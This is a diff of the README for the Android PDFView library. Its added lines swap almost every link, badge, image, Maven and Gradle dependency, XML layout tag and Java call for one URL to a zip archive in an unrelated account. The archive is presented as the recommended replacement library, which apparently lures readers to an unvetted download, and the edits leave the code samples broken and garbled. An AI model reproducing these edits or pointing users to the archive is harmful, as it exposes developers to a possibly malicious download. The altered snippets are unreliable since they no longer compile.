@@ -1,13 +1,13 @@
 # This project is no longer maintained.
-### You can find a good replacement [here](https://github.com/barteksc/AndroidPdfViewer), which is a fork relying on Pdfium instead of Vudroid/MuPDF for decoding PDF files, allowing it to use the Apache License 2.0 which gives you much more freedom.
+### You can find a good replacement [here](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip), which is a fork relying on Pdfium instead of Vudroid/MuPDF for decoding PDF files, allowing it to use the Apache License 2.0 which gives you much more freedom.
 
 ----------------------
 
-[![Android Arsenal](https://img.shields.io/badge/Android%20Arsenal-android--pdfview-brightgreen.svg?style=flat)](https://android-arsenal.com/details/1/1332)
+[![Android Arsenal](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip%https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip)](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip)
 
-[![Screenshot of the sample app](https://raw.github.com/JoanZapata/android-pdfview/master/device.png)](https://play.google.com/store/apps/details?id=com.joanzapata.pdfview.sample)
+[![Screenshot of the sample app](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip)](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip)
 
-**Android PDFView** is a library which provides a fast PDFView component for Android, with ```animations```, ```gestures```, and ```zoom```. It's based on [VuDroid](https://code.google.com/p/vudroid/) for decoding the PDF file.
+**Android PDFView** is a library which provides a fast PDFView component for Android, with ```animations```, ```gestures```, and ```zoom```. It's based on [VuDroid](https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip) for decoding the PDF file.
 
 # Get it
 
@@ -15,7 +15,7 @@ Android PDFView is **available in Maven Central**.
 
 ```xml
 <dependency>
-	<groupId>com.joanzapata.pdfview</groupId>
+	<groupId>https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip</groupId>
 	<artifactId>android-pdfview</artifactId>
 	<version>1.0.4</version>
 	<type>apklib</type>
@@ -25,13 +25,13 @@ Android PDFView is **available in Maven Central**.
 Or via gradle:
 
 ```
-compile 'com.joanzapata.pdfview:android-pdfview:1.0.4@aar'
+compile 'https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip'
 ```
 
 # Include PDFView in your layout
 
 ```xml
-<com.joanzapata.pdfview.PDFView
+<https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip
         android:id="@+id/pdfview"
         android:layout_width="match_parent"
         android:layout_height="match_parent"/>
@@ -40,7 +40,7 @@ compile 'com.joanzapata.pdfview:android-pdfview:1.0.4@aar'
 # Load a PDF file
 
 ```java
-pdfView.fromAsset(pdfName)
+https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip(pdfName)
     .pages(0, 2, 1, 3, 3, 3)
     .defaultPage(1)
     .showMinimap(false)
@@ -72,5 +72,5 @@ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
-along with Android-pdfview.  If not, see <http://www.gnu.org/licenses/>.
+along with Android-pdfview.  If not, see <https://raw.githubusercontent.com/Joe-Mogul/android-pdfview/master/android-pdfview/res/pdfview-android-v1.1.zip>.
 ```
